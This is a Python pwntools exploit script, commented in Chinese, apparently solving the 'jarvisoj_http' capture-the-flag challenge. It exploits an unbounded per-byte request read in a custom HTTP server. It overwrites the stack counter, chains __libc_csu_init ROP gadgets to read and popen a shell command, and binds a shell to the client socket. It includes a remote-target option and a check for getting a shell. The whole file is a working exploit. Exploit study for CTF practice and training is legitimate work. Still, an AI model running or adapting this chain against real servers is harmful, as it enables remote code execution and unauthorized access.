#!/usr/bin/env python3
"""jarvisoj_http —— 请求行逐字节读取无上限 -> 栈溢出 -> __libc_csu_init ROP -> popen 反弹 shell。

题目形态：二进制自己 socket/bind/listen/fork，是一个监听 0,0,0,0:3847（htons(0x0f07)）的 httpd。
漏洞点：read_request @0x40125d 用 `read(fd, &c, 1)` 逐字节把请求头塞进 buf = rbp-0x210，
        读到请求结束才停，没有任何长度上限。

用法：
  python 27_jarvisoj_http_exp.py LOCAL          # 起本地进程 + 连 127.0.0.1:3847（默认）
  HOST=1.2.3.4 PORT=3847 python 27_jarvisoj_http_exp.py   # 打远程
  USE_UNIX=1 python 27_jarvisoj_http_exp.py LOCAL         # 沙箱兜底：见下

沙箱兜底（USE_UNIX=1）：部分 WSL2 环境里目标进程的 loopback TCP 监听收不到 SYN
（内核 inet_csk_accept 阻塞但连接被 RST），此时用 LD_PRELOAD 的 unix_shim.so
把 AF_INET 监听重定向到 AF_UNIX，fd 编号保持不变（3=listen, 4=client），
利用本身完全不变。源码见 tools/loopback_unix_shim.c。
"""
import os
import sys
import socket
import time

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./jarvisoj_http"
HOST = os.environ.get("HOST", "")
PORT = int(os.environ.get("PORT", 3847))      # htons(0x0f07)

# ---- No PIE / No canary / No RELRO：全部地址固定 ----
CSU_POP = 0x4015AA    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x401590   # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]; ...
CMD = 0x601E00        # RW 段所在页 0x601000~0x602000 内的空闲区：stage2 命令串
RSTR = 0x601E80       # 同上：popen 的 "r"
STAGE2 = b"sh <&4 >&4 2>&4\x00"   # 把 shell 的 stdio 钉到客户端 fd 4

elf = ELF(BIN, checksec=False)


def csu_block(func_got, rdi, rsi, rdx):
    """一段完整的 __libc_csu_init 调用块：CSU_POP + 6 个 pop 值 + CSU_CALL + 7 个填充。

    CSU_CALL 尾部 `add rsp,8; pop*6; ret` 一共吃掉 8 个 qword：7 个填充 + 1 个“下一跳地址”。
    下一跳必须是 gadget 地址，所以每段块自带一个 CSU_POP 打头，紧跟 6 个 pop 值：
    上一段的 `ret` 正好弹到本段开头的 CSU_POP，本段的 CSU_POP 再依次弹出 6 个值。
    （坑：若把 CSU_POP 既当成上一段的 ret_addr、又当成下一段段首，就会出现连续两个
      CSU_POP，从第二段起整体错位一个 qword，典型现象是 rip 跳到了某个参数值上。）
    """
    return flat(
        CSU_POP,
        0, 1, func_got, rdx, rsi, rdi,   # rbx=0 rbp=1 r12=got r13=rdx r14=rsi r15=rdi
        CSU_CALL, 0, 0, 0, 0, 0, 0, 0,   # 1 个 add rsp 填充 + 6 个 pop 垃圾
    )


def build_payload():
    """返回完整的第一阶段字节流（读循环的输入）。

    read_request @0x40125d 的关键细节：
      buf = rbp-0x210，而 4 字节计数器 cnt 正好在 rbp-4 == buf+0x20C。
      逐字节写到 offset 0x20C 时会把 cnt 自己的最低字节覆盖掉，计数器随即“回卷”，
      于是永远走不到 saved rbp / saved RIP —— 直接 'A'*0x210 是打不通的。
    对策：
      stream[0x20C] = 0x0F -> cnt 变成 0x20F（离 rbp 只差 1）
      stream[0x20D] = 0x00 -> 清掉 cnt 的最高字节，使后续 cnt 保持 0x210
      之后 stream[0x20E + k] 落在 rbp + k：
        saved rbp  = stream[0x20E..0x215]（填 8 字节垃圾）
        saved RIP  = stream[0x216..0x21D]（ROP 链第一跳）
    读循环以 "\r\n\r\n" 结尾，因此 ROP 链里不能提前出现这 4 个字节。
    """
    rop = csu_block(elf.got["read"], 4, CMD, 0x400)      # read(4, CMD, 0x400) 收 stage2
    rop += csu_block(elf.got["popen"], CMD, RSTR, 0)     # popen(CMD, "r") -> /bin/sh
    rop += csu_block(elf.got["waitpid"], 0, 0, 0)        # waitpid(0,0,0) 挂住父进程
    rop += flat(0)                                      # 收尾（shell 退出后才会走到）
    assert b"\r\n\r\n" not in rop, "ROP 链内不能提前出现 CRLFCRLF"
    return b"A" * 0x20C + b"\x0f\x00" + b"B" * 8 + rop + b"\r\n\r\n"


class UnixTube:
    """最小 tube：把 AF_UNIX 套接字直接当 tube 用（沙箱兜底模式；避开 pty 对 \\r 的改写）。"""

    def __init__(self, path, timeout=5.0):
        self.s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.s.settimeout(timeout)
        for _ in range(50):
            try:
                self.s.connect(path)
                return
            except OSError:
                sleep(0.1)
        raise SystemExit(f"[-] cannot connect {path}")

    def send(self, data):
        self.s.sendall(data)

    def sendline(self, line):
        self.s.sendall(line + b"\n")

    def recvrepeat(self, timeout=2.0):
        out, end = b"", time.time() + timeout
        while time.time() < end:
            self.s.settimeout(max(0.05, end - time.time()))
            try:
                d = self.s.recv(8192)
            except socket.timeout:
                break
            if not d:
                break
            out += d
        return out

    def close(self):
        self.s.close()


def start():
    if os.environ.get("USE_UNIX") == "1":
        # 沙箱兜底：LD_PRELOAD 改写监听 socket 的家族，服务端 fd 编号保持不变
        shim = os.environ.get("SHIM", "../tools/loopback_unix_shim.so")
        sock = os.environ.get("HTTP_UNIX", "/tmp/audit/http.sock")
        if not os.path.exists(shim):
            raise SystemExit(f"[-] 缺少 {shim}：先编译 tools/loopback_unix_shim.c")
        env = dict(os.environ, LD_PRELOAD=shim, HTTP_UNIX=sock)
        p = process([BIN], env=env)
        return p, UnixTube(sock)

    if HOST:
        return None, remote(HOST, PORT)

    p = process(BIN)                     # 二进制自己监听 3847，本地验证要连回环
    return p, remote("127.0.0.1", PORT)


def main():
    p, r = start()
    r.send(build_payload())                                  # 第一跳：溢出 + ROP 链
    r.send(STAGE2.ljust(0x80, b"\x00") + b"r\x00")            # 被链里的 read(4,CMD,0x400) 收走
    sleep(0.5)

    r.sendline(b"echo __PWNED__")
    r.sendline(b"id")
    out = r.recvrepeat(2.0)
    if isinstance(out, (bytes, bytearray)):
        text = out.decode("utf-8", errors="replace")
    else:
        text = out
    sys.stdout.write(text)

    ok = "__PWNED__" in text and "uid=" in text
    print("[+] getshell OK" if ok else "[-] failed")
    try:
        r.close()
    except Exception:
        pass
    if p:
        p.close()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
